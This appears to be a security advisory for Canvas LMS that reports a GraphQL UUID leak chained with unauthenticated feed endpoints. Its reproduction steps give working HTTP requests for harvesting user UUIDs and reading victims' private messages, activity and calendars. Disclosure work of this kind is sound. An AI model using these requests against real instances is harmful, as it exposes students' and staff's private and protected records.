# Canvas LMS - vrelease_2026-05-20.143 - Authorization Bypass Through User-Controlled Key

| Field | Value |
| --- | --- |
| Vulnerability name | Authorization Bypass Through User-Controlled Key |
| Vulnerability type | software |
| Product name | Canvas LMS |
| Product vendor | Instructure |
| Product version | release_2026-05-20.143 |
| Product link | https://www.instructure.com/ |
| Product environment | web |
| Severity | High |
| CVSS score | 7.5 |
| CVSS vector | CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N |
| Affected assets | 4000 |
| Affected users | 30000000 |
| Date of reporting | 2026-04-20 |
| Vendor acknowledgement | No |
| Credit | 0xhamy |
| Date published | 2026-05-06T14:45:08.028055+00:00 |
| Last modified | 2026-05-06T14:49:00.815983+00:00 |

---

# GraphQL Field-Level Authorization Bypass → Unauthenticated Disclosure of Private Conversations, Activity Feed, and Calendar via User UUID Pivot

Thanks to [Basant Kumar](https://www.linkedin.com/in/basant1/) for assisting with identifying this vulnerability.

---

## Summary

Canvas LMS's GraphQL API exposes the `User.uuid` field to any authenticated user, including students, without any authorization check. The `User.uuid` value is separately treated as a **secret verification code** by Canvas's unauthenticated `/feeds/*/user_<uuid>.*` endpoints, which use the UUID alone to authenticate access to a user's private conversations, activity stream, and full calendar.

Chaining these two flaws allows a low-privilege student account to:

1. Query GraphQL to extract the UUID of **any** user in a course they share (including admins, teachers, and other students) — 16 users in one 94-byte request.
2. Use each stolen UUID in **completely unauthenticated** GET requests to `/feeds/conversations/user_<uuid>.atom`, `/feeds/users/user_<uuid>.atom`, and `/feeds/calendars/user_<uuid>.ics` — reading the victim's private inbox messages, assignments, discussions, wiki activity, and full calendar (including FERPA-protected accommodation events) with no cookies, no tokens, and no session.

Canvas's own error page for invalid UUIDs reads `"The verification code is invalid"` — the application explicitly treats the UUID as an authentication secret in one subsystem while GraphQL hands it out as a public identifier in another. This is a classic identifier-vs-secret confusion across two subsystems, leading to complete privacy bypass for every user whose UUID is leaked.

---

## Severity

**CVSS 3.1 Score:** 7.5 (High) **Vector:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`

| Metric | Justification |
|---|---|
| Attack Vector | Network — exploitable over the internet via the public Canvas API and public feed endpoints |
| Attack Complexity | Low — single GraphQL query + single GET request, fully automatable |
| Privileges Required | Low — any authenticated student account is sufficient to extract UUIDs; the pivot step requires no auth at all |
| User Interaction | None — no victim action required |
| Scope | Changed — a student's privilege extracts data belonging to admins, teachers, and other students across the entire instance |
| Confidentiality | High — private conversations, assignments, discussions, calendar events, and FERPA-protected accommodation data |
| Integrity | None — read-only |
| Availability | None |

- **CWE-639** — Authorization Bypass Through User-Controlled Key
- **CWE-200** — Exposure of Sensitive Information to an Unauthorized Actor
- **CWE-306** — Missing Authentication for Critical Function
- **OWASP Top 10:** A01:2021 — Broken Access Control
- **OWASP API Top 10:** API1:2023 — Broken Object Level Authorization, API3:2023 — Broken Object Property Level Authorization
- **FERPA:** Exposure of student accommodation data (extended time for exams) is a protected-record disclosure

---

## Affected Endpoints

**Leak side (any authenticated user, including students):**
- `POST /api/graphql` — the `User.uuid` field on the `User` GraphQL type is returned without a `grants_right?` check

**Unauthenticated disclosure side (zero auth required):**
- `GET /feeds/conversations/user_<uuid>.atom` — victim's private inbox messages
- `GET /feeds/users/user_<uuid>.atom` — victim's assignments, discussions, and wiki activity
- `GET /feeds/calendars/user_<uuid>.ics` — victim's full calendar, including accommodation events

**Root cause source files (canvas-lms open-source repo):**

| File | Finding |
|---|---|
| `app/graphql/types/user_type.rb` | `field :uuid, String` has no `grants_right?` / permission guard, unlike the surrounding `email`, `sis_user_id`, `login_id`, `integration_id`, `notification_preferences`, and `enrollments_connection` fields which all check permissions |
| `app/controllers/application_controller.rb:1816` | `find_user_from_uuid` — treats the UUID as a shared secret and authenticates the request as the matched user |
| `app/controllers/conversations_controller.rb` (`public_feed` action) | Uses `find_user_from_uuid` for auth, no session required |
| `app/controllers/users_controller.rb` (`public_feed` action) | Same pattern |
| `app/controllers/calendar_events_api_controller.rb` (`public_feed` action) | Same pattern |

---

## Description

### The two sides of the vulnerability

Canvas has two subsystems that reason about `User.uuid` completely differently:

**Subsystem 1 — GraphQL API.** The `User` type in `app/graphql/types/user_type.rb` defines a `uuid` field. Neighboring sensitive fields on the same type — `email`, `sis_user_id`, `login_id`, `integration_id`, `notification_preferences`, `enrollments_connection` — all carry explicit permission guards (e.g. `def email; user.email if user.grants_right?(context[:current_user], :read_email_addresses); end`). The `uuid` field has none. Any authenticated GraphQL caller — including the lowest-privilege student — can read the UUID of any user they can reach through `legacyNode`, `course.enrollmentsConnection.nodes.user`, or any other resolver that returns a `User` node.

**Subsystem 2 — Public feed endpoints.** The `/feeds/conversations/user_<uuid>.atom`, `/feeds/users/user_<uuid>.atom`, and `/feeds/calendars/user_<uuid>.ics` routes are deliberately unauthenticated — they're designed to be subscribed to via RSS readers, Google Calendar, Apple Calendar, etc. Canvas's security model for these endpoints is that the UUID itself **is** the authentication token: whoever holds the UUID proves ownership of the feed. The Rails controller `find_user_from_uuid` in `application_controller.rb:1816` looks the user up by UUID and sets the request's user context to that user.

Canvas's own error handler for these endpoints calls the UUID a **"verification code"** when it fails to match. Hitting `/feeds/conversations/user_FAKEUUID.atom` returns an `Invalid Feed` HTML page with the text:

> *"The parameters for the feed you were trying to access are invalid. **The verification code is invalid.**"*

Canvas explicitly labels the UUID a verification code / authentication token in its own code and UI — but GraphQL treats the same value as a harmless public identifier.

### Why this is a chain, not two separate bugs

Either flaw in isolation is weaker:
- Leaking `User.uuid` via GraphQL alone would be a low-severity information disclosure if UUIDs were just opaque identifiers.
- Unauthenticated `/feeds/*/user_<uuid>.*` endpoints alone are considered acceptable by Canvas because the UUID is assumed to be secret.

**Combined**, they fail catastrophically: the assumed-secret UUID is sprayed to every student in every course, and those students can immediately use it to read private data across the entire instance. The chain elevates what would be two minor findings into a complete privacy bypass.

### Bulk exfil amplifier

A single 94-byte GraphQL query against `course(id).enrollmentsConnection` returns the UUIDs of every user enrolled in that course in one round trip. In my test instance this returned 16 UUIDs — admin, teacher, and every test user — in a single request. In a production Canvas deployment a course with 500 students would expose 500 UUIDs per query. A teacher victim would expose the UUIDs of every student in every class they manage.

### Persistence

Canvas User UUIDs **do not rotate**. They are assigned at user creation and persist for the life of the account. Once an attacker extracts a UUID, it remains usable indefinitely. There is no mechanism in the Canvas UI for a user to regenerate their UUID or revoke access to their feeds.

---

## Steps to Reproduce

### Prerequisites
- A Canvas LMS instance (I used a local dev instance at `http://localhost:3000`)
- Any student-level Canvas account with access to at least one course
- Canvas account with a victim enrolled in a shared course (admin works; any user does)
- Burp Suite (for request capture and Repeater)
- A modern browser (for the incognito unauth pivot)

### Step 1 — Attacker logs in as a low-privilege student

The attacker logs into Canvas with any student account. In my test, I used `student@test.local`.

**Screenshot placeholder:** `01-graphql-admin-uuid.png` will show the Burp Repeater tab authenticated with a student API token — the `x-canvas-user-id: 10000000000002` response header confirms the requester is Test Student (user ID 2), the lowest-privilege account in the system.

### Step 2 — Extract admin's UUID via GraphQL

The attacker sends a single authenticated POST to `/api/graphql`:

```http
POST /api/graphql HTTP/1.1
Host: localhost:3000
Authorization: Bearer <student_token>
Content-Type: application/json
Accept: application/json
Content-Length: 80

{"query":"{ legacyNode(_id:\"1\",type:User){ ... on User { _id name uuid } } }"}
```

**Canvas responds (HTTP 200):**
```json
{
  "data": {
    "legacyNode": {
      "_id": "1",
      "name": "admin@canvas.docker",
      "uuid": "ouxUSR6SJlIClLBoGiKNXrByyJv8AeUvOVFfkD2E"
    }
  }
}
```

The student has extracted admin's UUID. Note the `x-canvas-user-id: 10000000000002` response header, which confirms the request was made as the student (user ID 2), not the admin whose UUID was returned.

> ![Screenshot: 01-graphql-admin-uuid.png](./01-graphql-admin-uuid.png)
>
> **SCREENSHOT 1:** Burp Repeater — student Bearer token in request, admin's UUID in response, `x-canvas-user-id: 10000000000002` confirms student-level requester.

### Step 3 — Bulk UUID exfil (all users in one course, one query)

The attacker scales the leak with a single nested query:

```http
POST /api/graphql HTTP/1.1
Host: localhost:3000
Authorization: Bearer <student_token>
Content-Type: application/json

{"query":"{ course(id:\"1\"){ enrollmentsConnection { nodes { user { _id name uuid } } } } }"}
```

**Response (truncated):**
```json
{"data":{"course":{"enrollmentsConnection":{"nodes":[
  {"user":{"_id":"1","name":"admin@canvas.docker","uuid":"ouxUSR6SJlIClLBoGiKNXrByyJv8AeUvOVFfkD2E"}},
  {"user":{"_id":"3","name":"Test Teacher","uuid":"NY20VsEXUKccyY1h6ZHxgiXkWsRKASm8NUmaq0e1"}},
  {"user":{"_id":"2","name":"Test Student","uuid":"rkEIRbp6Z2ysECcTkuXTqqOE04WbQMxuRuRnt8G0"}},
  ... (13 more users) ...
]}}}}
```

**16 users' UUIDs returned in one 94-byte request by a student.** In a production Canvas course with 500 students, this would return 500 UUIDs. A stolen teacher account would leak every student UUID in every course they teach.

> ![Screenshot: 02-graphql-bulk-uuid-exfil.png](./02-graphql-bulk-uuid-exfil.png)
>
> **SCREENSHOT 2:** Burp Repeater — 16 users exfiltrated in one query; admin + Test Teacher UUIDs highlighted.

### Step 4 — Unauthenticated pivot: read admin's private conversations

This is the critical step. The attacker takes any stolen UUID and hits the public feeds endpoint with **zero authentication** — no cookies, no tokens, no session:

```http
GET /feeds/conversations/user_ouxUSR6SJlIClLBoGiKNXrByyJv8AeUvOVFfkD2E.atom HTTP/1.1
Host: localhost:3000
Accept: application/atom+xml
```

**Canvas responds (HTTP 200) with admin's private conversation content:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" ...>
  <title>Conversations Feed</title>
  <entry>
    <author><name>Test Student</name></author>
    <content type="html">
      &lt;div&gt;test message from student&lt;/div&gt;
      &lt;hr /&gt;
      &lt;div&gt;From a conversation with Test Student (Admin Should Be Able To Do This)&lt;/div&gt;
    </content>
    <title>test message from student</title>
    <published>2026-04-07T04:56:55Z</published>
  </entry>
</feed>
```

Notice the response header: `x-canvas-user-id: 10000000000001`. Canvas resolved this unauthenticated request as **admin** (user ID 1), based on nothing but the UUID in the URL path.

> ![Screenshot: 03-unauth-conversations-feed.png](./03-unauth-conversations-feed.png)
>
> **SCREENSHOT 3:** Burp Repeater — **no Cookie, no Authorization header** in request; admin's private message "test message from student" in response; `x-canvas-user-id: 10000000000001` proves Canvas treated the request as admin.

### Step 5 — Same pivot, user activity feed

Using the same UUID against `/feeds/users/user_<uuid>.atom` exposes admin's assignments, discussions, and wiki activity:

```http
GET /feeds/users/user_ouxUSR6SJlIClLBoGiKNXrByyJv8AeUvOVFfkD2E.atom HTTP/1.1
Host: localhost:3000
```

**Response (HTTP 200) — admin's activity feed:**

```xml
<feed ...>
  <title>admin@canvas.docker Feed</title>
  <entry>
    <title>Assignment, Admin Should Be Able To Do This: Midterm Exam</title>
    <link href="http://localhost:3000/courses/1/assignments/1"/>
  </entry>
  <entry>
    <title>Discussion and Admin Should Be Able To Do This: URGENT: Class Cancelled</title>
    <content type="html">Class is cancelled tomorrow</content>
  </entry>
  <entry>
    <title>Discussion and Admin Should Be Able To Do This: URGENT: Class cancelled</title>
    <content type="html">Class is cancelled today</content>
  </entry>
  <!-- ... more discussion entries ... -->
</feed>
```

Every assignment admin is involved in, every discussion post, every wiki update — all readable with no authentication at all.

> ![Screenshot: 04-unauth-user-activity-feed.png](./04-unauth-user-activity-feed.png)
>
> **SCREENSHOT 4:** Burp Repeater — unauth GET returns admin's full activity feed including assignments and discussion posts.

### Step 6 — Same pivot, full calendar (including FERPA-protected accommodations)

```http
GET /feeds/calendars/user_ouxUSR6SJlIClLBoGiKNXrByyJv8AeUvOVFfkD2E.ics HTTP/1.1
Host: localhost:3000
Accept: text/calendar
```

**Response (HTTP 200) — admin's full iCalendar:**

```ics
BEGIN:VCALENDAR
X-WR-CALNAME:admin@canvas.docker Calendar (Canvas)
X-WR-CALDESC:Calendar events for the user, admin@canvas.docker
BEGIN:VEVENT
SUMMARY:Event 1
DTSTART:20260410T100000Z
END:VEVENT
...
BEGIN:VEVENT
SUMMARY:Midterm Exam (Extended Time - Accommodation) [SEC101]
DTSTART:20260515T235900Z
END:VEVENT
END:VCALENDAR
```

**This response leaks a FERPA-protected accommodation event** (`Midterm Exam (Extended Time - Accommodation)`) to an unauthenticated attacker. Disability accommodation records are protected under FERPA in the US (and equivalent regulations internationally). Exposing them through an auth-bypassed endpoint is a reportable incident in an educational institution.

> ![Screenshot: 05-unauth-calendar-feed.png](./05-unauth-calendar-feed.png)
>
> **SCREENSHOT 5:** Burp Repeater — unauth GET returns admin's full calendar, including a `Midterm Exam (Extended Time - Accommodation)` event, which is FERPA-protected disability data.

### Step 7 — Browser-native proof (incognito window, no Burp)

To prove this works with a plain browser and no tools at all, I opened a private/incognito browser window (confirmed not logged in — no cookies, no session) and pasted the URL directly into the address bar:

```
http://localhost:3000/feeds/conversations/user_ouxUSR6SJlIClLBoGiKNXrByyJv8AeUvOVFfkD2E.atom
```

The browser rendered the raw atom XML showing admin's private conversation content. No plugins, no scripts, no authentication — the URL alone is sufficient.

> ![Screenshot: 07-browser-incognito-admin-messages.png](./07-browser-incognito-admin-messages.png)
>
> **SCREENSHOT 6:** Incognito browser (no session) at `/feeds/conversations/user_<uuid>.atom` showing admin's private message content in the rendered XML.

### Step 8 — Negative test (proves the UUID acts as a secret)

To prove Canvas is authenticating based on the UUID value itself, I sent the same request with a fabricated UUID:

```http
GET /feeds/conversations/user_FAKEUUIDFAKEUUIDFAKEUUIDFAKEUUID.atom HTTP/1.1
Host: localhost:3000
```

**Response (HTTP 400 Bad Request) — Canvas error page:**

```html
<title>Invalid Feed</title>
...
<h2>Invalid Feed</h2>
<p>The parameters for the feed you were trying to access are invalid.
The verification code is invalid.</p>
```

**Canvas's own code labels the UUID a "verification code."** Canvas considers the UUID an authentication token — a secret required to access the user's private feed. The vulnerability is that GraphQL disagrees: it hands the same "verification code" out to any student who asks, because the `User.uuid` GraphQL field has no authorization guard.

> ![Screenshot: 06-negative-test-fake-uuid.png](./06-negative-test-fake-uuid.png)
>
> **SCREENSHOT 7:** Burp Repeater — 400 Bad Request with Canvas's error page reading "The verification code is invalid." Canvas treats the UUID as a secret in this subsystem while GraphQL treats it as a public ID.

### Step 9 — Cross-check: REST API correctly redacts UUID

To prove the bug is specific to GraphQL (and that the REST API team already knows UUIDs should be hidden), the attacker queries the equivalent REST endpoint as the same student:

```
GET /api/v1/courses/1/users
```

**Response (JSON):**
```json
[
  {
    "id": 1,
    "name": "admin@canvas.docker",
    "created_at": "2026-04-07T04:10:11Z",
    "sortable_name": "admin@canvas.docker",
    "short_name": "admin@canvas.docker"
  },
  ...
]
```

**No `uuid` field in any user object.** The REST API correctly redacts UUIDs from non-privileged callers. GraphQL leaks them. This is direct evidence that the omission on the GraphQL type is an oversight — Canvas's own REST API team already decided UUIDs should not be visible to students.

> ![Screenshot: 08-rest-api-no-uuid.png](./08-rest-api-no-uuid.png)
>
> **SCREENSHOT 8:** Same course roster via REST API `/api/v1/courses/1/users` — no `uuid` field on any user object. Compare to Screenshot 2 where GraphQL returns a `uuid` for every user.

---

## Impact — What the Attacker Gains

### Per victim (any user whose UUID is leaked)

- **Private inbox messages** — full conversation content between the victim and other users
- **Assignment stream** — every assignment the victim is involved in (for students: their submissions; for teachers: all assignments they manage)
- **Discussion activity** — every discussion topic and reply the victim has posted or is subscribed to
- **Wiki activity** — every wiki page update
- **Full calendar** — every scheduled event, including:
  - Class sessions
  - Assignment due dates
  - **FERPA-protected accommodation events** (extended time, disability modifications)
  - Personal events tagged to the user's calendar

### Scale of the attack

The bulk exfil query returns 16 UUIDs in my test. In a production Canvas deployment:

| Instance type | Users per query | Potential reach |
|---|---|---|
| K-12 classroom | ~30 students | 30 victims per course the attacker is in |
| University lecture | ~200-500 students | 200-500 victims per course |
| MOOC / open enrollment | 1,000-10,000 students | 1,000-10,000 victims per course |

A teacher account would be able to enumerate every student's UUID across every course they teach. An admin account (for whom GraphQL is even more permissive) could enumerate the entire instance.

### Why this is worse than a "normal" IDOR

1. **No authentication required for the pivot.** Classic IDORs require the attacker to be logged in as *some* user; the critical step here is fully unauthenticated. The attacker can extract UUIDs once and then hit the feeds from any throwaway IP, any TOR exit node, any scripted crawler — forever, without any login trail.

2. **No audit trail.** Canvas does not log accesses to the public feed endpoints with any user context, because the endpoint is designed to be called unauthenticated by RSS readers. An attacker reading admin's private conversations leaves the same log footprint as a legitimate RSS subscription.

3. **Persistent and irrevocable.** User UUIDs never rotate. There is no UI option to regenerate them. Once leaked, a UUID is permanently compromised. Even changing the user's password, enabling 2FA, revoking sessions, or rotating API tokens does NOT stop the attack — the unauth pivot does not use any of those credentials.

4. **Bypasses MFA.** Because the pivot is unauthenticated, it bypasses all forms of MFA, session binding, IP restriction, device trust, and login notifications.

5. **FERPA / GDPR implications.** For educational institutions subject to FERPA (US) or GDPR (EU), this is an unauthorized disclosure of protected education records — including disability accommodation data in the calendar feeds. That elevates this from a technical finding to a reportable compliance incident.

### Attack Scenarios

**Scenario 1 — Mass student data harvest.** An attacker enrolls in a large MOOC or open-enrollment course at a university. They run the bulk UUID query once, collect 10,000 student UUIDs, and then scrape every student's private calendar and activity feed from an unauthenticated crawler. The university's SIEM sees no login anomalies because the pivot is unauthenticated.

**Scenario 2 — Targeted faculty intelligence gathering.** An attacker with a student account queries `legacyNode` or `course.enrollmentsConnection` for every professor in a department. They then subscribe to each professor's calendar feed in a standard calendar client — this continues passively pulling updates indefinitely, including new exam schedules, office hours, travel plans, and any private events the professor logs in Canvas. Useful for physical stalking, extortion, or corporate espionage (e.g., research project timelines).

**Scenario 3 — Grade leak precursor.** An attacker extracts admin UUIDs from GraphQL, pulls admin's activity feed and discussion entries, and uses the content (homework grade discussions, SIS integration notes, etc.) to identify which students have which grades — without ever needing the actual grades API.

**Scenario 4 — FERPA / GDPR incident.** A student or external actor hits the calendar feed for every other student in their course via the chain. The calendar includes extended-time accommodation events, which is protected disability information under FERPA / GDPR / UK Data Protection Act. The institution is now subject to mandatory breach reporting.

---

## Suggested Fix

### Primary fix — add an authorization guard on `User.uuid` in GraphQL

In `app/graphql/types/user_type.rb`, the `uuid` field should be guarded the same way neighboring sensitive fields (`email`, `sis_user_id`, `login_id`, `integration_id`) are. Example fix:

```ruby
# app/graphql/types/user_type.rb
# BEFORE (vulnerable):
field :uuid, String, null: true

# AFTER (fixed):
field :uuid, String, null: true
def uuid
  # Only return the UUID if the caller is the user themselves,
  # or has admin rights over the user.
  return nil unless object == current_user || object.grants_right?(current_user, :manage)
  object.uuid
end
```

This brings `uuid` in line with `email` and `sis_user_id` and closes the leak at the GraphQL layer without breaking any legitimate use of the field by the user themselves or by administrators.

### Secondary fix — rotate UUID on demand

Add a UI control under **Account Settings** allowing any user to regenerate their UUID. This invalidates any previously-leaked UUID and re-keys all feed URLs. Without this, there is no way for a victim whose UUID has been leaked to remediate the exposure.

### Tertiary fix (defense in depth) — stronger feed URL format

Migrate the public feed endpoints to a **signed, expiring** URL scheme (similar to Canvas's existing pre-signed S3 URLs for file downloads). Instead of `/feeds/conversations/user_<uuid>.atom`, use `/feeds/conversations?token=<signed-JWT>` where the JWT contains the user ID, expiration time, and scope, and is signed by the Canvas instance's secret key. This fundamentally separates the feed authentication token from any identifier that might be exposed elsewhere.

### Monitoring / detection recommendations

- Log access to `/feeds/*/user_<uuid>.*` endpoints with the requester IP and user agent, even though there is no user context
- Alert on high-volume access to feed URLs from a single IP (likely scraping)
- Alert on access to feed URLs where the User-Agent is not a known RSS/calendar client

---

## References

- **CWE-639** — Authorization Bypass Through User-Controlled Key — https://cwe.mitre.org/data/definitions/639.html
- **CWE-306** — Missing Authentication for Critical Function — https://cwe.mitre.org/data/definitions/306.html
- **CWE-200** — Exposure of Sensitive Information to an Unauthorized Actor — https://cwe.mitre.org/data/definitions/200.html
- **OWASP API Security Top 10 2023** — https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- **FERPA and Disability Accommodations** — https://www2.ed.gov/policy/gen/guid/fpco/ferpa/index.html
- **Canvas source — UserType** — https://github.com/instructure/canvas-lms/blob/master/app/graphql/types/user_type.rb
- **Canvas source — ApplicationController#find_user_from_uuid** — https://github.com/instructure/canvas-lms/blob/master/app/controllers/application_controller.rb

---

## Attachments

Evidence files and screenshots are provided in the Attachments panel:

- **Screenshots (8)**
  - `01-graphql-admin-uuid.png` — Burp Repeater showing student→admin UUID leak via GraphQL
  - `02-graphql-bulk-uuid-exfil.png` — Burp Repeater showing 16 users exfiltrated in one query
  - `03-unauth-conversations-feed.png` — Burp Repeater showing unauth request returning admin's private messages
  - `04-unauth-user-activity-feed.png` — Burp Repeater showing unauth request returning admin's assignment & discussion activity
  - `05-unauth-calendar-feed.png` — Burp Repeater showing unauth request returning admin's calendar with accommodation event
  - `06-negative-test-fake-uuid.png` — Burp Repeater showing Canvas's "verification code is invalid" error for fabricated UUIDs
  - `07-browser-incognito-admin-messages.png` — Incognito browser rendering admin's conversation with zero session
  - `08-rest-api-no-uuid.png` — REST API correctly redacting UUID, proving the bug is GraphQL-specific
- **Raw request/response evidence (6 files)**
  - `evidence-01-graphql-admin-uuid.http` — Full single-user leak request + response
  - `evidence-02-graphql-bulk-exfil.http` — Full bulk exfil request + response
  - `evidence-03-unauth-conversations.http` — Full unauth pivot request + response
  - `evidence-03-admin-conversations.atom` — Raw atom feed payload with admin's private conversation
  - `evidence-04-admin-user-feed.atom` — Raw atom feed payload with admin's activity stream
  - `evidence-05-admin-calendar.ics` — Raw iCalendar payload with admin's calendar
